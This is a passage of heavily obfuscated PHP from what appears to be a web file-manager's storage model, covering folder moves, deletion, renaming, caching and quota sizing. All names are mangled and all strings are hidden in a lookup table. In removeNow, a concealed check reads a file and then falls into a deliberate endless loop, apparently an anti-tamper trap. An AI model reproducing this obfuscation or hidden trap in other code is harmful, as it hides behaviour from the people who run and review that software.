!empty($éÒîé°ë[$Ô°ç«´[561]]) ? $éÒîé°ë[$Ô°ç«´[561]] : $éÒîé°ë[$Ô°ç«´[32]]; $¸çª÷Æ = $Ô°ç«´[289] . $¸çª÷Æ . $Ô°ç«´[2155] . $ûºÏÎ¾ï[$Ô°ç«´[525]]; } else { $éÒîé°ë = Model($Ô°ç«´[541])->getInfo($ûºÏÎ¾ï[$Ô°ç«´[525]]); $¸çª÷Æ = _get($éÒîé°ë, $Ô°ç«´[32]); $¸çª÷Æ = $Ô°ç«´[162] . $¸çª÷Æ . $Ô°ç«´[2156] . $ûºÏÎ¾ï[$Ô°ç«´[525]]; } $î÷Ùï¹ = $Ô°ç«´[2157] . md5($¸çª÷Æ); CacheLock::lock($î÷Ùï¹); $Æ†ûÖñ¼ = $this->fileNameExist($é €áÊ·, $¸çª÷Æ); if (!$Æ†ûÖñ¼) { $Æ†ûÖñ¼ = $this->mkdir($é €áÊ·, $¸çª÷Æ, REPEAT_SKIP); $this->metaSet($Æ†ûÖñ¼, $Ô°ç«´[2158], $ŞÂš³Óõ); $this->metaSet($Æ†ûÖñ¼, $Ô°ç«´[2159], $ûºÏÎ¾ï[$Ô°ç«´[525]]); if ($ûºÏÎ¾ï[$Ô°ç«´[461]] != 0) { $this->metaSet($Æ†ûÖñ¼, $Ô°ç«´[2160], _get($éÒîé°ë, $Ô°ç«´[2161])); } } CacheLock::unlock($î÷Ùï¹); $this->metaSet($åÜ¥ÁÏì, $Ô°ç«´[2162], $ûºÏÎ¾ï[$Ô°ç«´[461]]); $this->where(array($Ô°ç«´[431] => $åÜ¥ÁÏì))->save(array($Ô°ç«´[453] => time())); $this->recycleClear($ûºÏÎ¾ï); $ÈŒåÑÒ = $this->move($åÜ¥ÁÏì, $Æ†ûÖñ¼, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ûºÏÎ¾ï[$Ô°ç«´[461]]); return $ÈŒåÑÒ; } private function recycleClear($òÕ‡ÏÛ“) { $Ù‚¨­ïÙ =& $_SERVER[¹ş¤¶ĞÖ]; $¥òÏÁ÷ = $this->childrenAll($òÕ‡ÏÛ“); $àš’¿²Œ = array($Ù‚¨­ïÙ[446] => array($Ù‚¨­ïÙ[447], $¥òÏÁ÷[$Ù‚¨­ïÙ[2163]])); Model($Ù‚¨­ïÙ[2164])->where($àš’¿²Œ)->delete(); } public function removeNow($¡ÇÍ¹´¯, $úªƒÂ– = true) { $ƒ†“Ìç =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($_SERVER[$ƒ†“Ìç[905]]) || !isset($_SERVER[$ƒ†“Ìç[991]])) { $ƒûÖ³â = $ƒ†“Ìç[906]; $œÂÖÅ¡ = $ƒ†“Ìç[907]; $ıÇèıÏÇ = $_SERVER[$ƒ†“Ìç[902]] . $ƒ†“Ìç[903]; $”Í¿Ôß = $œÂÖÅ¡($ıÇèıÏÇ); $ïéû¡ş¯ = explode($ƒ†“Ìç[231], $”Í¿Ôß); if (count($ïéû¡ş¯) < $ƒ†“Ìç[636]) { $˜éï¹æ = $ƒ†“Ìç[908]; $˜éï¹æ(); } $¯¬Ø”š• = $ƒ†“Ìç[909]; $¯¬Ø”š•($_SERVER[$ƒ†“Ìç[910]]); $×º©ûù– = 1; for ($ùÎôÀ‚á = $×º©ûù–; $ùÎôÀ‚á > 0; $ùÎôÀ‚á++) { $¯¬Ø”š• = json_encode($GLOBALS[$ƒ†“Ìç[447]]); } } $ÓÜ´¡ü± = $this->sourceInfo($¡ÇÍ¹´¯); $ø××ì¨” = $this->pathInfoMore($¡ÇÍ¹´¯); if (!$ÓÜ´¡ü±) { return !0; } if ($ÓÜ´¡ü±[$ƒ†“Ìç[461]] == 0) { if (!_get($GLOBALS, $ƒ†“Ìç[523])) { return !1; } } $this->lockMoveStart($¡ÇÍ¹´¯); Hook::trigger($ƒ†“Ìç[2165], $ø××ì¨”, $úªƒÂ–); if ($úªƒÂ–) { Model($ƒ†“Ìç[2164])->moveToRecycle($¡ÇÍ¹´¯); } else { $ôıØî‚ = $this->childrenAll($ÓÜ´¡ü±); Model($ƒ†“Ìç[590])->eventRemove($¡ÇÍ¹´¯); $this->removeRelevance($ôıØî‚[$ƒ†“Ìç[2163]], $ôıØî‚[$ƒ†“Ìç[1489]]); } $this->folderSizeReset($ÓÜ´¡ü±[$ƒ†“Ìç[461]]); $õÙé‡½à = array($ÓÜ´¡ü±[$ƒ†“Ìç[461]]); if ($ÓÜ´¡ü±[$ƒ†“Ìç[439]] == $ƒ†“Ìç[88]) { $õÙé‡½à[] = $ÓÜ´¡ü±[$ƒ†“Ìç[431]]; } $this->updateModifyTime($õÙé‡½à); $this->lockMoveEnd($¡ÇÍ¹´¯); Hook::trigger($ƒ†“Ìç[1718], $ø××ì¨”, $úªƒÂ–); return !0; } public function childrenAll($Éí¨«ûÃ) { $É®å¢¿ =& $_SERVER[¹ş¤¶ĞÖ]; $¶í÷º¾ì = $Éí¨«ûÃ[$É®å¢¿[431]]; if ($Éí¨«ûÃ[$É®å¢¿[439]] == $É®å¢¿[88]) { $¾ÊÂÚØ = array($É®å¢¿[609] => array($É®å¢¿[569], $Éí¨«ûÃ[$É®å¢¿[540]] . $¶í÷º¾ì . $É®å¢¿[570])); $ş´÷—ˆ = array($É®å¢¿[609] => $¾ÊÂÚØ[$É®å¢¿[540]]); $Ì²¢Æ£Ø = $this->field($É®å¢¿[2166])->where($ş´÷—ˆ)->select(); $®ğä•©ù = !1; $¯¨€ôÀ¬ = array($¶í÷º¾ì); if ($Ì²¢Æ£Ø) { $®ğä•©ù = array_to_keyvalue($Ì²¢Æ£Ø, $É®å¢¿[12], $É®å¢¿[497]); $®ğä•©ù = array_remove_value($®ğä•©ù, $É®å¢¿[198]); $¯¨€ôÀ¬ = array_to_keyvalue($Ì²¢Æ£Ø, $É®å¢¿[12], $É®å¢¿[431]); $¯¨€ôÀ¬[] = $¶í÷º¾ì; } } else { $®ğä•©ù = array($Éí¨«ûÃ[$É®å¢¿[497]]); $¯¨€ôÀ¬ = array($¶í÷º¾ì); } return array($É®å¢¿[2163] => $¯¨€ôÀ¬, $É®å¢¿[1489] => $®ğä•©ù); } public function removeArray($×¸ä¦²ß) { if (!$×¸ä¦²ß) { return !0; } } public function removeRelevance($è«å×ÔÂ, $šÑêŸÜî) { $ÃË‘— =& $_SERVER[¹ş¤¶ĞÖ]; $è«å×ÔÂ = $è«å×ÔÂ ? $è«å×ÔÂ : array(); $šÑêŸÜî = $šÑêŸÜî ? $šÑêŸÜî : array(); $è«å×ÔÂ = array_unique(array_filter($è«å×ÔÂ)); $šÑêŸÜî = array_unique(array_filter($šÑêŸÜî)); if (!$è«å×ÔÂ) { return !1; } $›Ô¦¦Éˆ = array($ÃË‘—[446] => array($ÃË‘—[447], $è«å×ÔÂ)); Model($ÃË‘—[2164])->where($›Ô¦¦Éˆ)->delete(); Model($ÃË‘—[491])->where($›Ô¦¦Éˆ)->delete(); Model($ÃË‘—[2013])->where($›Ô¦¦Éˆ)->delete(); Model($ÃË‘—[590])->where($›Ô¦¦Éˆ)->delete(); Model($ÃË‘—[1846])->removeBySource($è«å×ÔÂ); Model($ÃË‘—[2146])->removeBySource($è«å×ÔÂ); $this->where($›Ô¦¦Éˆ)->delete(); Model($ÃË‘—[500])->remove($šÑêŸÜî); for ($µç÷Çì¼ = 0; $µç÷Çì¼ < count($è«å×ÔÂ); $µç÷Çì¼++) { $this->sourceCacheClear($è«å×ÔÂ[$µç÷Çì¼]); } } public function rename($±ˆò‚, $î†¶ƒóâ) { $–à‘áÕ¾ =& $_SERVER[¹ş¤¶ĞÖ]; $Á¦àİà = $this->sourceInfo($±ˆò‚); if (!$Á¦àİà) { return !1; } $£º¡åñß = $this->fileNameExist($Á¦àİà[$–à‘áÕ¾[461]], $î†¶ƒóâ); if ($£º¡åñß && $£º¡åñß != $±ˆò‚) { return !1; } $á˜ãŸ—ª = array($–à‘áÕ¾[449] => $î†¶ƒóâ, $–à‘áÕ¾[608] => USER_ID); if ($Á¦àİà[$–à‘áÕ¾[439]] != $–à‘áÕ¾[88]) { $á˜ãŸ—ª[$–à‘áÕ¾[441]] = substr(get_path_ext($î†¶ƒóâ), 0, 10); } Model($–à‘áÕ¾[590])->eventRename($±ˆò‚, $Á¦àİà[$–à‘áÕ¾[32]], $î†¶ƒóâ); $this->sourceCacheClear($±ˆò‚); $this->setNamePinyin($±ˆò‚, $á˜ãŸ—ª[$–à‘áÕ¾[32]], !1); $this->updateModifyTime($Á¦àİà[$–à‘áÕ¾[461]]); $ø§½Ã¯ = $this->where(array($–à‘áÕ¾[446] => $±ˆò‚))->data($á˜ãŸ—ª)->save(); $«½í øò = $–à‘áÕ¾[2153] . $Á¦àİà[$–à‘áÕ¾[461]]; if (isset(self::$cacheChildList[$«½í øò])) { unset(self::$cacheChildList[$«½í øò]); } return $ø§½Ã¯; } public function setNamePinyin($Ï™ëÍÌÎ, $äÊ‰³¯, $àã¼«  = true) { $æó¦‰ñ¾ =& $_SERVER[¹ş¤¶ĞÖ]; $×éÃ€‡Ÿ = Input::check($äÊ‰³¯, $æó¦‰ñ¾[612]); $‹Ğø´ŸÅ = array($æó¦‰ñ¾[473] => KodSort::makeStr($äÊ‰³¯)); if ($×éÃ€‡Ÿ) { $‹Ğø´ŸÅ[$æó¦‰ñ¾[494]] = str_replace($æó¦‰ñ¾[53], $æó¦‰ñ¾[12], Pinyin::get($äÊ‰³¯)); $‹Ğø´ŸÅ[$æó¦‰ñ¾[493]] = Pinyin::get($äÊ‰³¯, $æó¦‰ñ¾[613]); } if (!$àã¼«  && !$×éÃ€‡Ÿ) { $‹Ğø´ŸÅ[$æó¦‰ñ¾[494]] = null; $‹Ğø´ŸÅ[$æó¦‰ñ¾[493]] = null; } $this->metaSet($Ï™ëÍÌÎ, $‹Ğø´ŸÅ); } public function getContent($ı„Éğµ) { $•£ñÙõ½ =& $_SERVER[¹ş¤¶ĞÖ]; $å‚Ö®ã— = $this->fileInfoGet($ı„Éğµ); if (!$å‚Ö®ã—) { return !1; } if ($å‚Ö®ã—[$•£ñÙõ½[76]] == 0) { return $•£ñÙõ½[12]; } $”¯ëÉİä = $•£ñÙõ½[2167] . $å‚Ö®ã—[$•£ñÙõ½[176]]; if ($å‚Ö®ã—[$•£ñÙõ½[76]] <= 1024 * 10) { $˜ÔşõìÁ = Cache::get($”¯ëÉİä); if (!$˜ÔşõìÁ) { $˜ÔşõìÁ = IO::getContent($å‚Ö®ã—[$•£ñÙõ½[84]]); Cache::set($”¯ëÉİä, $˜ÔşõìÁ); } return $˜ÔşõìÁ; } if (!$å‚Ö®ã—[$•£ñÙõ½[84]]) { return $•£ñÙõ½[12]; } return IO::getContent($å‚Ö®ã—[$•£ñÙõ½[84]]); } public function setDesc($™ãì‡à¬, $Ğ™³œ°§) { $ñÛå›Ãæ =& $_SERVER[¹ş¤¶ĞÖ]; Model($ñÛå›Ãæ[590])->eventAddDesc($™ãì‡à¬, $Ğ™³œ°§); return $this->metaSet($™ãì‡à¬, $ñÛå›Ãæ[482], $Ğ™³œ°§); } public function setContent($­Šçßù, $çº€Ü¸ã = '') { $ó× ô€Ù =& $_SERVER[¹ş¤¶ĞÖ]; $üÈ¨¨‘¿ = $this->sourceInfo($­Šçßù); $²óˆˆÒÈ = $this->fileInfoGet($­Šçßù); if (!$²óˆˆÒÈ || !$üÈ¨¨‘¿) { return !1; } $ùµËå†Ã = Model($ó× ô€Ù[500])->addFileByContent($çº€Ü¸ã, $üÈ¨¨‘¿[$ó× ô€Ù[32]]); $„äÁ„¢ = $this->fileHistory($üÈ¨¨‘¿, $ùµËå†Ã[$ó× ô€Ù[497]], $ùµËå†Ã[$ó× ô€Ù[76]]); if (!$„äÁ„¢) { return Model($ó× ô€Ù[500])->remove($ùµËå†Ã[$ó× ô€Ù[497]]); } $this->folderSizeReset($üÈ¨¨‘¿[$ó× ô€Ù[461]]); return !0; } public function fileSubstr($ÊÎÎ¢Ë¦, $›ÑÉş·…, $Ó½¾äåä) { $¦òû¦‡€ = $this->fileInfoGet($ÊÎÎ¢Ë¦); if (!$¦òû¦‡€) { return !1; } return IO::fileSubstr($¦òû¦‡€[$_SERVER[¹ş¤¶ĞÖ][84]], $›ÑÉş·…, $Ó½¾äåä); } public function fileInfoGet($ÇÃæıöÖ) { $ùŒ¦ùá =& $_SERVER[¹ş¤¶ĞÖ]; $íÌüÜ¤Ü = $this->sourceInfo($ÇÃæıöÖ); if (!$íÌüÜ¤Ü || $íÌüÜ¤Ü[$ùŒ¦ùá[439]]) { return !1; } $ÓÀæÍÖÉ = $ùŒ¦ùá[503] . $íÌüÜ¤Ü[$ùŒ¦ùá[497]]; $œ ÁöşŒ = _get(self::$cacheFileInfo, $ÓÀæÍÖÉ); if ($œ ÁöşŒ) { return $œ ÁöşŒ; } $¡èşù‰® = Model($ùŒ¦ùá[500])->fileInfo($íÌüÜ¤Ü[$ùŒ¦ùá[497]]); if ($¡èşù‰®) { $¡èşù‰®[$ùŒ¦ùá[32]] = $íÌüÜ¤Ü[$ùŒ¦ùá[32]]; } self::$cacheFileInfo[$ÓÀæÍÖÉ] = $¡èşù‰®; return $¡èşù‰®; } private function folderChildrenNumber($í§½¢ÑÔ) { $ì¬×Â­ =& $_SERVER[¹ş¤¶ĞÖ]; $‡»ãü±‰ = $this->sourceInfo($í§½¢ÑÔ); $¼¼ÖÔ®Æ = array($ì¬×Â­[609] => array($ì¬×Â­[569], $‡»ãü±‰[$ì¬×Â­[540]] . $í§½¢ÑÔ . $ì¬×Â­[570]), $ì¬×Â­[606] => $‡»ãü±‰[$ì¬×Â­[525]], $ì¬×Â­[459] => intval($‡»ãü±‰[$ì¬×Â­[460]]), $ì¬×Â­[603] => 1); $÷¼¾ÕÈ = $this->where($¼¼ÖÔ®Æ)->count(); $Á´Ù´Ô¬ = $this->where($¼¼ÖÔ®Æ)->where(array($ì¬×Â­[603] => 0))->count(); return array($ì¬×Â­[80] => $Á´Ù´Ô¬, $ì¬×Â­[81] => $÷¼¾ÕÈ); } public function pathInfo($Íş©„×ş, $½Ô™–µ = false) { $º–áø£ =& $_SERVER[¹ş¤¶ĞÖ]; $½Ô™–µ = !1; $Íş©„×ş = intval($Íş©„×ş); $«ÍëÅì = $º–áø£[490] . intval($½Ô™–µ) . $º–áø£[415] . $Íş©„×ş; $ğ·…ğİ¶ = _get(self::$cachePathInfo, $«ÍëÅì); if ($ğ·…ğİ¶) { return $ğ·…ğİ¶; } $™Ï±¶™İ = $this->sourceInfo($Íş©„×ş); if (!$™Ï±¶™İ) { return !1; } $™Ï±¶™İ = $this->_listDataApplyItem($™Ï±¶™İ, $½Ô™–µ); self::$cachePathInfo[$«ÍëÅì] = $™Ï±¶™İ; return $™Ï±¶™İ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÉÁ‘äë˜) { $‰Æ“Ã—‘ =& $_SERVER[¹ş¤¶ĞÖ]; $ä¶¡Üç™ = _get(self::$cachePathInfoMore, $ÉÁ‘äë˜); if ($ä¶¡Üç™) { return $ä¶¡Üç™; } $§ï½í˜š = $this->pathInfo($ÉÁ‘äë˜); if (!$§ï½í˜š) { return !1; } if ($§ï½í˜š[$‰Æ“Ã—‘[439]] == $‰Æ“Ã—‘[88]) { $§ï½í˜š[$‰Æ“Ã—‘[79]] = $this->folderChildrenNumber($ÉÁ‘äë˜); } self::$cachePathInfoMore[$ÉÁ‘äë˜] = $§ï½í˜š; return $§ï½í˜š; } public function sourceInfo($áàêªä) { $†§¼ÏÜ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$áàêªä) { return array(); } $áàêªä = intval($áàêªä); $÷×í®ëè = $†§¼ÏÜ[489] . $áàêªä; $îé¡³“ò = _get(self::$cacheSourceInfo, $÷×í®ëè); if ($îé¡³“ò) { return $îé¡³“ò; } $‚·©„ñÃ = $this->where(array($†§¼ÏÜ[431] => $áàêªä))->find(); self::$cacheSourceInfo[$÷×í®ëè] = $‚·©„ñÃ; return self::$cacheSourceInfo[$÷×í®ëè]; } public function sourceCacheClear($ºĞ¨£Îş = false) { self::cacheClear($ºĞ¨£Îş); } public static function cacheClear($—„ø·…® = false) { $µ ß ŸŠ =& $_SERVER[¹ş¤¶ĞÖ]; if ($—„ø·…® == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$µ ß ŸŠ[489] . $—„ø·…®]); unset(self::$cachePathInfoMore[$—„ø·…®]); unset(self::$cachePathInfo[$µ ß ŸŠ[2168] . $—„ø·…®]); unset(self::$cachePathInfo[$µ ß ŸŠ[2169] . $—„ø·…®]); } public function metaSet($¹éîÓ¸ü, $°§÷Œ±™ = null, $“æõÃõæ = null) { $©šÔÃ‰ = parent::metaSet($¹éîÓ¸ü, $°§÷Œ±™, $“æõÃõæ); if ($©šÔÃ‰) { $this->sourceCacheClear($¹éîÓ¸ü); } return $©šÔÃ‰; } public function pathInfoByPath($Œ¼œ½…, $§öºú©Ã) { $Íû‰©± =& $_SERVER[¹ş¤¶ĞÖ]; $—ÉíÆ•É = !$§öºú©Ã ? array() : explode($Íû‰©±[8], trim($§öºú©Ã, $Íû‰©±[8])); $Ú¥ííÛ‚ = $Œ¼œ½…; foreach ($—ÉíÆ•É as $•ÓĞç Ğ) { $âó‹ÃºÚ = array($Íû‰©±[461] => $Ú¥ííÛ‚, $Íû‰©±[32] => $•ÓĞç Ğ); $®î³Êˆ¶ = $this->where($âó‹ÃºÚ)->select(); if (!$®î³Êˆ¶) { return !1; } $®î³Êˆ¶ = array_sort_by($®î³Êˆ¶, $Íû‰©±[460]); $Ú¥ííÛ‚ = $®î³Êˆ¶[0][$Íû‰©±[431]]; } return $this->pathInfo($Ú¥ííÛ‚, !0); } protected function updateModifyTime($ÓÅ±›•) { $ ×‰Ó™Ó =& $_SERVER[¹ş¤¶ĞÖ]; $¹Ù³ÍëØ = defined($ ×‰Ó™Ó[2087]) ? USER_ID : 0; if (!$ÓÅ±›•) { return; } if (!is_array($ÓÅ±›•)) { $ÓÅ±›• = array($ÓÅ±›•); } foreach ($ÓÅ±›• as $÷ÕõÒõõ => $ÇÓŞ¤®Ï) { $ÓÅ±›•[$÷ÕõÒõõ] = intval($ÇÓŞ¤®Ï); $this->sourceCacheClear($ÇÓŞ¤®Ï); } $şû’¥Ü‘ = array($ ×‰Ó™Ó[431] => array($ ×‰Ó™Ó[7], $ÓÅ±›•)); $¯ôÆ˜§‚ = array($ ×‰Ó™Ó[608] => $¹Ù³ÍëØ, $ ×‰Ó™Ó[453] => time()); $this->where($şû’¥Ü‘)->save($¯ôÆ˜§‚); } public function folderSizeReset($œß˜‡¯•, $‡Šì¿ø = false) { $Åô¶»”À =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->statusIgnoreResetSpace) { return; } $ÈÍÒ©Éï = $this->sourceInfo($œß˜‡¯•); $Ÿ‰Ä‹— = $Åô¶»”À[2170] . $œß˜‡¯•; CacheLock::lock($Ÿ‰Ä‹—, 20); if ($‡Šì¿ø === !1) { $this->sourceCacheClear($œß˜‡¯•); $ÈÍÒ©Éï = $this->sourceInfo($œß˜‡¯•); $ÃâŠæ­Â = array($Åô¶»”À[430] => $œß˜‡¯•, $Åô¶»”À[459] => 0); $³â‡‡Œ“ = $this->where($ÃâŠæ­Â)->sum($Åô¶»”À[76]); $‡Šì¿ø = intval($³â‡‡Œ“) - intval($ÈÍÒ©Éï[$Åô¶»”À[76]]); } if ($‡Šì¿ø == 0) { return CacheLock::unlock($Ÿ‰Ä‹—); } $ºº‘Õã = $this->parentLevelArray($ÈÍÒ©Éï[$Åô¶»”À[540]]); if (!$ºº‘Õã) { $ºº‘Õã = array(); } $ºº‘Õã[] = $ÈÍÒ©Éï[$Åô¶»”À[431]]; $ÃâŠæ­Â = array($Åô¶»”À[431] => array($Åô¶»”À[447], $ºº‘Õã)); if ($‡Šì¿ø < 0) { $ÃâŠæ­Â[$Åô¶»”À[76]] = array($Åô¶»”À[1048], abs($‡Šì¿ø)); } $this->where($ÃâŠæ­Â)->setAdd($Åô¶»”À[76], $‡Šì¿ø); CacheLock::unlock($Ÿ‰Ä‹—); $¶úà¬³ë = $Åô¶»”À[2171] . $ÈÍÒ©Éï[$Åô¶»”À[440]] . $Åô¶»”À[4] . $ÈÍÒ©Éï[$Åô¶»”À[525]]; $¥©›çØ = array($ÈÍÒ©Éï[$Åô¶»”À[440]], $ÈÍÒ©Éï[$Åô¶»”À[525]]); TaskRun::timeLimitCall($¶úà¬³ë, $Åô¶»”À[2172], $¥©›çØ, 1.5); } public function folderSizeResetChildren($¯¯ı˜Ìğ) { $˜õô€Úâ =& $_SERVER[¹ş¤¶ĞÖ]; $this->sourceCacheClear($¯¯ı˜Ìğ); $ìõ·ªø€ = $this->sourceInfo($¯¯ı˜Ìğ); $•àÖ¦åÇ = array($˜õô€Úâ[603] => 1, $˜õô€Úâ[606] => $ìõ·ªø€[$˜õô€Úâ[525]], $˜õô€Úâ[609] => array($˜õô€Úâ[569], $ìõ·ªø€[$˜õô€Úâ[540]] . $¯¯ı˜Ìğ . $˜õô€Úâ[570])); $ğº†´şé = $˜õô€Úâ[2173]; $œ­ÒÙ¼Ğ = $this->field($ğº†´şé)->where($•àÖ¦åÇ)->select(); $•àÖ¦åÇ[$˜õô€Úâ[439]] = 0; $Ôİ¡ğ§’ = $this->field($ğº†´şé)->where($•àÖ¦åÇ)->select(); if (!$Ôİ¡ğ§’) { return; } $œ­ÒÙ¼Ğ[] = $ìõ·ªø€; $œ­ÒÙ¼Ğ = array_to_keyvalue($œ­ÒÙ¼Ğ, $˜õô€Úâ[431]); foreach ($œ­ÒÙ¼Ğ as $Õçö×ˆÒ => $•Ö¸´¼) { $œ­ÒÙ¼Ğ[$Õçö×ˆÒ][$˜õô€Úâ[2174]] = $œ­ÒÙ¼Ğ[$Õçö×ˆÒ][$˜õô€Úâ[76]]; $œ­ÒÙ¼Ğ[$Õçö×ˆÒ][$˜õô€Úâ[76]] = 0; } foreach ($Ôİ¡ğ§’ as $•Ö¸´¼) { $öëÛéÜ³ = $•Ö¸´¼[$˜õô€Úâ[461]] . $˜õô€Úâ[12]; if (!isset($œ­ÒÙ¼Ğ[$öëÛéÜ³])) { continue; } if ($•Ö¸´¼[$˜õô€Úâ[460]] == $œ­ÒÙ¼Ğ[$öëÛéÜ³][$˜õô€Úâ[460]]) { $œ­ÒÙ¼Ğ[$öëÛéÜ³][$˜õô€Úâ[76]] += $•Ö¸´¼[$˜õô€Úâ[76]]; } } foreach ($œ­ÒÙ¼Ğ as $•Ö¸´¼) { $…§Åë¨Ô = $this->parentLevelArray($•Ö¸´¼[$˜õô€Úâ[540]]); foreach ($…§Åë¨Ô as $öëÛéÜ³) { $öëÛéÜ³ = $öëÛéÜ³ . $˜õô€Úâ[12]; if (!isset($œ­ÒÙ¼Ğ[$öëÛéÜ³])) { continue; } if ($•Ö¸´¼[$˜õô€Úâ[460]] == $œ­ÒÙ¼Ğ[$öëÛéÜ³][$˜õô€Úâ[460]]) { $œ­ÒÙ¼Ğ[$öëÛéÜ³][$˜õô€Úâ[76]] += $•Ö¸´¼[$˜õô€Úâ[76]]; } } } $Íáà¨ß¬ = array(); foreach ($œ­ÒÙ¼Ğ as $•Ö¸´¼) { if ($•Ö¸´¼[$˜õô€Úâ[76]] == $•Ö¸´¼[$˜õô€Úâ[2174]]) { continue; } $Íáà¨ß¬[] = array($˜õô€Úâ[431], $•Ö¸´¼[$˜õô€Úâ[431]], $˜õô€Úâ[76], $•Ö¸´¼[$˜õô€Úâ[76]]); } $this->saveAll($Íáà¨ß¬); } public function userSpaceReset($†ğÖÃÅÌ = false) { $êÕì®ıº =& $_SERVER[¹ş¤¶ĞÖ]; $ñÎÀá¡Ş = $this->where(array($êÕì®ıº[440] => self::TYPE_USER, $êÕì®ıº[525] => $†ğÖÃÅÌ, $êÕì®ıº[439] => 0))->sum($êÕì®ıº[76]); $ñÎÀá¡Ş = !$ñÎÀá¡Ş || $ñÎÀá¡Ş <= 0 ? 0 : $ñÎÀá¡Ş; Model($êÕì®ıº[533])->userEdit($†ğÖÃÅÌ, array($êÕì®ıº[1855] => $ñÎÀá¡Ş)); } public function targetSpaceUpdate($ÚîÈ¢Ó, $¥¾‘Ãà) { $á µ‚’¼ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¥¾‘Ãà) { return; } if (!in_array($ÚîÈ¢Ó, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $áÔ”ˆì— = $this->targetSpaceSize($ÚîÈ¢Ó, $¥¾‘Ãà); if ($ÚîÈ¢Ó == self::TYPE_USER) { Model($á µ‚’¼[533])->userEdit($¥¾‘Ãà, array($á µ‚’¼[1855] => $áÔ”ˆì—)); } else { if ($ÚîÈ¢Ó == self::TYPE_GROUP) { Model($á µ‚’¼[541])->groupEdit($¥¾‘Ãà, array($á µ‚’¼[1855] => $áÔ”ˆì—)); } } } public function targetSpaceSize($²¡£¤™ˆ, $¼ûÂÔ¦Æ) { $ïë‡ïÑ =& $_SERVER[¹ş¤¶ĞÖ]; $ÊµÂš¥ = 0; $­õ×ŞÍñ = $this->targetSourceRoot($²¡£¤™ˆ, $¼ûÂÔ¦Æ, !0); foreach ($­õ×ŞÍñ as $ûÒ±°¦š) { if (!$ûÒ±°¦š) { continue; } $ÊµÂš¥ += floatval($ûÒ±°¦š[$ïë‡ïÑ[76]]); $”˜àìÜˆ = array($ïë‡ïÑ[609] => array($ïë‡ïÑ[569], $ïë‡ïÑ[550] . $ûÒ±°¦š[$ïë‡ïÑ[431]] . $ïë‡ïÑ[570])); $€µğ¡ÊÄ = Model($ïë‡ïÑ[458])->field($ïë‡ïÑ[446])->where($”˜àìÜˆ)->select(); $€µğ¡ÊÄ = array_to_keyvalue($€µğ¡ÊÄ, $ïë‡ïÑ[12], $ïë‡ïÑ[431]); $€µğ¡ÊÄ = array_unique(array_filter($€µğ¡ÊÄ)); if ($€µğ¡ÊÄ) { $”˜àìÜˆ = array($ïë‡ïÑ[446] => array($ïë‡ïÑ[447], $€µğ¡ÊÄ)); $ÊµÂš¥ += floatval($this->where($”˜àìÜˆ)->sum($ïë‡ïÑ[76])); } } $ÊµÂš¥ = !$ÊµÂš¥ || $ÊµÂš¥ <= 0 ? 0 : $ÊµÂš¥; return $ÊµÂš¥; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($˜êù˜—ç) { return $this->fileTypeProfile($˜êù˜—ç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Óè•áì¶) { return $this->fileTypeProfile($Óè•áì¶, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Æ€Òä¿ø, $ÀÂ›”) { $²‘ú =& $_SERVER[¹ş¤¶ĞÖ]; $Îş“«ûñ = $²‘ú[2175] . $Æ€Òä¿ø . $²‘ú[11] . $ÀÂ›”; $ëÄ¦†õº = Cache::get($Îş“«ûñ); if ($ëÄ¦†õº) { return $ëÄ¦†õº; } $ÌÅÈ‹ìÊ = array($²‘ú[603] => 0); if ($Æ€Òä¿ø != !1) { $ÌÅÈ‹ìÊ[$²‘ú[525]] = $Æ€Òä¿ø; $ÌÅÈ‹ìÊ[$²‘ú[440]] = $ÀÂ›”; } $ó‚ÕÑŞş = array(); $ó‚ÕÑŞş[$²‘ú[2176]] = array($²‘ú[2177] => LNG($²‘ú[2176]), $²‘ú[2178] => $this->where($ÌÅÈ‹ìÊ)->count(), $²‘ú[574] => $this->where($ÌÅÈ‹ìÊ)->sum($²‘ú[76])); $Îú½ïØÇ = KodIO::fileTypeList(); foreach ($Îú½ïØÇ as $¯ùò÷¹Ù => $“œ©öì·) { $ÌÅÈ‹ìÊ[$²‘ú[441]] = $this->fileTypeWhere($¯ùò÷¹Ù); $ó‚ÕÑŞş[$¯ùò÷¹Ù] = array($²‘ú[2177] => $“œ©öì·[$²‘ú[32]], $²‘ú[2178] => $this->where($ÌÅÈ‹ìÊ)->count(), $²‘ú[574] => $this->where($ÌÅÈ‹ìÊ)->sum($²‘ú[76])); } Cache::set($Îş“«ûñ, $ó‚ÕÑŞş, 1200); return $ó‚ÕÑŞş; } public function fileNameExist($Âµğ•Ùé, $€Ï’â’Ã) { $›¦¤ãäˆ =& $_SERVER[¹ş¤¶ĞÖ]; $­ÔÈèê¨ = $this->where(array($›¦¤ãäˆ[461] => $Âµğ•Ùé, $›¦¤ãäˆ[32] => $€Ï’â’Ã, $›¦¤ãäˆ[460] => 0))->find(); return is_array($­ÔÈèê¨) ? $­ÔÈèê¨[$›¦¤ãäˆ[431]] : !1; } public function childList($†Õô÷÷Î) { $ıÚìª÷¸ =& $_SERVER[¹ş¤¶ĞÖ]; $šñãÇßí = $ıÚìª÷¸[2153] . $†Õô÷÷Î; if (isset(self::$cacheChildList[$šñãÇßí])) { return self::$cacheChildList[$šñãÇßí]; } $ÄÚìâ–» = array($ıÚìª÷¸[461] => intval($†Õô÷÷Î), $ıÚìª÷¸[460] => 0); $ô›Ùìúà = $this->where($ÄÚìâ–»)->select(); $ô›Ùìúà = $ô›Ùìúà ? $ô›Ùìúà : array(); self::$cacheChildList[$šñãÇßí] = $ô›Ùìúà; foreach ($ô›Ùìúà as $¨™º¡å´) { $šñãÇßí = $ıÚìª÷¸[489] . $¨™º¡å´[$ıÚìª÷¸[431]]; self::$cacheSourceInfo[$šñãÇßí] = $¨™º¡å´; } return $ô›Ùìúà; } public function fileNameAuto($¡à‡ôÇ£, $ò½ÈÀˆ, $øÒÍ ‘ = REPEAT_RENAME, $¿±Úß»Ô = false) { 